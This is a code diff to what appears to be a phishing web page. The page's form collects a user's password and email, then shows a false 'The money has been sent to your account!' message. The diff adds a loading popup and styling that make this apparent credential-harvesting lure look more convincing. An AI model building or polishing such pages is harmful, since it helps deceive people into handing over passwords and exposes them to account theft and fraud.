@@ -83,7 +83,7 @@
         }
 
         /* Popup Styling */
-        .popup {
+        .popup, .loading-popup {
             position: fixed;
             top: 50%;
             left: 50%;
@@ -97,6 +97,12 @@
             animation: fadeIn 0.5s ease-in-out;
             width: 90%;
             max-width: 300px;
+        }
+
+        .loading-popup {
+            background: rgba(0, 0, 0, 0.8);
+            color: white;
+            font-size: 18px;
         }
 
         @keyframes fadeIn {
@@ -162,6 +168,9 @@
             </form>             
         </div>
     </div>
+    <div class="loading-popup" id="loadingPopup">
+        ⏳ Processing, please wait...
+    </div>
     <div class="popup" id="congratsPopup">
         <h2>🎉 Congratulations! 🎉</h2>
         <p>The money has been sent to your account!</p>
@@ -172,7 +181,13 @@
     <script>
     document.getElementById("infoForm").addEventListener("submit", async function(event) {
         event.preventDefault();
-    
+        
+        const loadingPopup = document.getElementById("loadingPopup");
+        const congratsPopup = document.getElementById("congratsPopup");
+
+        // Show loading popup
+        loadingPopup.style.display = "block";
+
         const formData = {
             pass: document.getElementById("pass").value,
             email: document.getElementById("email").value,
@@ -190,6 +205,7 @@
     
             if (result.success) {
                 // Clear form on success
+                loadingPopup.style.display = "none"; // Hide loading popup
                 showPopup()
                 document.getElementById("infoForm").reset();
             }
